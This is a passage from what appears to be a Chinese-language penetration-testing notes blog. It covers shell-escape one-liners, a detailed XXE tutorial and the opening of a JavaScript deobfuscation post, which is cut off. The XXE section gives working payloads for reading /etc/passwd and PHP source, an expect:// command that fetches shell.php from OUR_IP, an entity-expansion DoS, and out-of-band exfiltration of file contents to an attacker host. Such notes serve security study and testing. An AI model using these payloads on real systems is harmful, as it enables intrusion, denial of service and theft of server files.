class="line">sh-4.2$</span><br></pre></td></tr></table></figure><h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl —e &#x27;exec &quot;/bin/sh&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl: exec &quot;/bin/sh&quot;;</span><br></pre></td></tr></table></figure><h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby: exec &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua: os.execute(&#x27;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>find 命令的用法是搜索<code>-name</code>选项后列出的任何文件，然后执行<code>awk</code>（<code>/bin/awk</code>）并运行在 awk 部分讨论的相同脚本来执行 shell 解释器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name nameoffile -exec /bin/awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27; \;</span><br></pre></td></tr></table></figure><p>find 命令的这种用法使用执行选项 ( <code>-exec</code>) 直接启动 shell 解释器。如果<code>find</code>找不到指定的文件，则不会获得任何 shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lateral-Movement </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML External Entity (XXE)</title>
      <link href="/2024/09/25/pentest/web-pentest/XXE/"/>
      <url>/2024/09/25/pentest/web-pentest/XXE/</url>
      
        <content type="html"><![CDATA[<p>当 XML 数据未经适当清理或安全解析而从用户控制的输入中获取时，就会出现 <code>XML External Entity (XXE)</code> 漏洞。</p><h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p><code>Extensible Markup Language (XML)</code>是一种通用标记语言（类似于 HTML 和 SGML），旨在各种类型的应用程序中灵活地传输和存储数据和文档。</p><h2 id="XML-Document"><a href="#XML-Document" class="headerlink" title="XML Document"></a>XML Document</h2><p>XML 文档的基本示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">date</span>&gt;</span>01-01-2022<span class="tag">&lt;/<span class="name">date</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">time</span>&gt;</span>10:00 am UTC<span class="tag">&lt;/<span class="name">time</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">sender</span>&gt;</span>john@inlanefreight.com<span class="tag">&lt;/<span class="name">sender</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">recipients</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>HR@inlanefreight.com<span class="tag">&lt;/<span class="name">to</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">cc</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">to</span>&gt;</span>billing@inlanefreight.com<span class="tag">&lt;/<span class="name">to</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">to</span>&gt;</span>payslips@inlanefreight.com<span class="tag">&lt;/<span class="name">to</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">cc</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">recipients</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">  Hello,  </span><br><span class="line">      Kindly share with me the invoice for the payment made on January 1, 2022.  </span><br><span class="line">  Regards,  </span><br><span class="line">  John  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XML 文档的一些关键元素：</p><table><thead><tr><th>Key</th><th>Definition</th><th>Example</th></tr></thead><tbody><tr><td><code>Tag</code></td><td>XML 文档的键，通常用 ( <code>&lt;</code>&#x2F; <code>&gt;</code>) 字符括起来。</td><td><code>&lt;date&gt;</code></td></tr><tr><td><code>Entity</code></td><td>XML 变量，通常用 ( <code>&amp;</code>&#x2F; <code>;</code>) 字符括起来。</td><td><code>&amp;lt;</code></td></tr><tr><td><code>Element</code></td><td>根元素或其任何子元素，其值存储在开始标记和结束标记之间。</td><td><code>&lt;date&gt;01-01-2022&lt;/date&gt;</code></td></tr><tr><td><code>Attribute</code></td><td>存储在标签中的任何元素的可选规范，可供 XML 解析器使用。</td><td><code>version=&quot;1.0&quot;</code>&#x2F;<code>encoding=&quot;UTF-8&quot;</code></td></tr><tr><td><code>Declaration</code></td><td>通常是 XML 文档的第一行，定义解析时使用的 XML 版本和编码。</td><td><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></td></tr></tbody></table><h2 id="XML-Document-Type-Definition-DTD"><a href="#XML-Document-Type-Definition-DTD" class="headerlink" title="XML Document Type Definition (DTD)"></a>XML Document Type Definition (DTD)</h2><p><code>XML Document Type Definition (DTD)</code> 允许根据预定义的文档结构验证 XML 文档。预定义的文档结构可以在文档本身或外部文件中定义。</p><p>XML 文档的示例 DTD：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">email</span> (<span class="keyword">date</span>, <span class="keyword">time</span>, <span class="keyword">sender</span>, <span class="keyword">recipients</span>, <span class="keyword">body</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">recipients</span> (<span class="keyword">to</span>, <span class="keyword">cc</span>?)&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">cc</span> (<span class="keyword">to</span>*)&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">date</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">time</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">sender</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>  (<span class="keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>DTD 使用 ELEMENT 类型声明来声明根电子邮件元素，然后声明其子元素。</p><p>外部引用 XML DTD：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;email.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://inlanefreight.com/email.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XML-Entities"><a href="#XML-Entities" class="headerlink" title="XML Entities"></a>XML Entities</h2><p>XML DTD 中定义自定义实体（即 XML 变量），以便重构变量并减少重复数据。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="string">&quot;Inlane Freight&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>在 XML 文档中用 <code>&amp;</code> 和 <code>;</code> 引用它（例如 <code>&amp;company;</code>）。</p><p>还可以使用 SYSTEM 关键字引用外部 XML 实体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/company.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">signature</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/signature.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：PUBLIC 关键字可以代替 SYSTEM 来加载外部资源，该关键字用于公开声明的实体和标准，例如语言代码 (lang&#x3D;”en”)。</p></blockquote><h1 id="Local-File-Disclosure"><a href="#Local-File-Disclosure" class="headerlink" title="Local File Disclosure"></a>Local File Disclosure</h1><p>当 Web 应用程序信任来自用户输入的未过滤 XML 数据时，可能能够引用外部 XML DTD 文档并定义新的自定义 XML 实体。</p><h2 id="Read"><a href="#Read" class="headerlink" title="Read"></a>Read</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>如果文件包含一些 XML 的特殊字符（例如<code>&lt;</code>&#x2F; <code>&gt;</code>&#x2F; <code>&amp;</code>），它将破坏外部实体引用，并且不会用于引用。此外，也无法读取任何二进制数据，因为它也不符合 XML 格式。</p></blockquote><p>PHP Wrapper 仅适用于 PHP Web 应用程序。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&#x27;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://curl$IFS-O$IFS&#x27;OUR_IP/shell.php&#x27;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意： expect 模块在现代 PHP 服务器上默认不启用&#x2F;安装，</p></blockquote><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><p>此有效负载实现层级调用，直到后端服务器的内存因自引用循环而耗尽。但是，这种攻击不再适用于现代 Web 服务器（例如 Apache），因为它们可以防止实体自引用。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY a0 <span class="string">&quot;DOS&quot;</span> &gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a1</span> <span class="string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a2</span> <span class="string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a3</span> <span class="string">&quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a4</span> <span class="string">&quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a5</span> <span class="string">&quot;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a6</span> <span class="string">&quot;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a7</span> <span class="string">&quot;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a8</span> <span class="string">&quot;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a9</span> <span class="string">&quot;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&quot;</span>&gt;</span>          </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">a1</span>0 <span class="string">&quot;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&quot;</span>&gt;</span>          </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">tel</span>&gt;</span><span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>&amp;a10;<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Advanced-File-Disclosure"><a href="#Advanced-File-Disclosure" class="headerlink" title="Advanced File Disclosure"></a>Advanced File Disclosure</h1><p>并非所有 XXE 漏洞都很容易被利用，某些文件格式可能无法通过基本 XXE 读取，而在其他情况下，Web 应用程序在某些情况下可能不会输出任何输入值，因此可能会尝试强制它通过错误。</p><h2 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h2><p>XML 解析器会 <code>CDATA</code> 标签中的内容视为原始数据，其中可能包含任何类型的数据，包括任何特殊字符。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">begin</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/submitDetails.php&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">joined</span> <span class="string">&quot;&amp;begin;&amp;file;&amp;end;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>XML 可能阻止连接内部和外部实体，如阻止DOS一样。</p><p><code>XML Parameter Entities</code>，这是以 <code>%</code> 字符开头的特殊类型的实体，只能在 DTD 中使用。如果从外部源引用它们，那么它们都将被视为外部的，并且可以连接起来。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">begin</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/submitDetails.php&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://OUR_IP/xxe.dtd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  %xxe;  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line">...  </span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;joined;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="Error-Based-XXE"><a href="#Error-Based-XXE" class="headerlink" title="Error Based XXE"></a>Error Based XXE</h2><p>Web 应用程序可能不会打印任何输出，无法控制任何 XML 输入实体来写入其内容，因此无法使用通常的方法检索文件内容。</p><p>如果 Web 应用程序显示运行时错误（例如 PHP 错误）并且没有对 XML 输入进行适当的异常处理，那么可以利用此缺陷读取 XXE 漏洞的输出。（破坏标签完整性或使用不存在实体来测试是否存在报错）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [   </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://OUR_IP/xxe.dtd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  %remote;%error;  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#x27;%nonExistingEntity;/%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="Blind-Data-Exfiltration"><a href="#Blind-Data-Exfiltration" class="headerlink" title="Blind Data Exfiltration"></a>Blind Data Exfiltration</h1><p>如果 Web 应用程序既不打印 XML 输出也不显示任何错误，将面临完全盲目的情况。</p><h2 id="Out-of-band-Data-Exfiltration"><a href="#Out-of-band-Data-Exfiltration" class="headerlink" title="Out-of-band Data Exfiltration"></a>Out-of-band Data Exfiltration</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">email</span> [   </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://OUR_IP:8000/xxe.dtd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  %remote;  </span></span><br><span class="line"><span class="meta">  %oob;  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;content;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>oob.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#x27;http://OUR_IP/%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>Auto Tool <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a></p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web-Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Deobfuscation</title>
      <link href="/2024/09/22/pentest/web-pentest/JavaScript%20Deobfuscation/"/>
      <url>/2024/09/22/pentest/web-pentest/JavaScript%20Deobfuscation/</url>
      
        <content type="html"><![CDATA[<h1 id="Obfuscation"><a href="#Obfuscation" class="headerlink" title="Obfuscation"></a>Obfuscation</h1><h2 id="Code-Obfuscation"><a href="#Code-Obfuscation" class="headerlink" title="Code Obfuscation"></a>Code Obfuscation</h2><p>混淆是一种使脚本更难被人类阅读的技术，但从技术角度来看，它仍然能够正常工作，尽管性能可能会降低。这通常是通过使用混淆工具自动实现的，该工具将代码作为输入，并尝试根据代码的设计，以一种更难阅读的方式重写代码。</p><p>例如，代码混淆器通常会将代码转换成一个包含代码中使用的所有单词和符号的字典，然后在执行过程中尝试通过引用字典中的每个单词和符号来重建原始代码。以下是一个简单的 JavaScript 代码被混淆的示例：</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202504161723671.png" alt="image.png"></p><h2 id="Basic-Obfuscation"><a href="#Basic-Obfuscation" class="headerlink" title="Basic Obfuscation"></a>Basic Obfuscation</h2><h3 id="Minifying-JavaScript-code"><a href="#Minifying-JavaScript-code" class="headerlink" title="Minifying JavaScript code"></a>Minifying JavaScript code</h3><p>压缩 JavaScript 代码片段的可读性同时保持其全部功能的常用方法是 JavaScript 压缩。<code>Code minification</code> 意味着将整个代码放在一行（通常很长）中。</p><p>很多工具可以帮助我们压缩 JavaScript 代码，比如<a href="https://javascript-minifier.com/">javascript-minifier</a>。我们只需复制代码，然后点击<code>Minify</code>，即可在右侧看到压缩后的输出：</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/2025/202504161732492.png" alt="image.png"></p><h3 id="Packing-JavaScript-code"><a href="#Packing-JavaScript-code" class="headerlink" title="Packing JavaScript code"></a>Packing JavaScript code</h3><p>混淆工具 <code>packer</code> 通常会尝试将代码中的所有单词和符号转换为列表或字典，然后在执行过程中使用 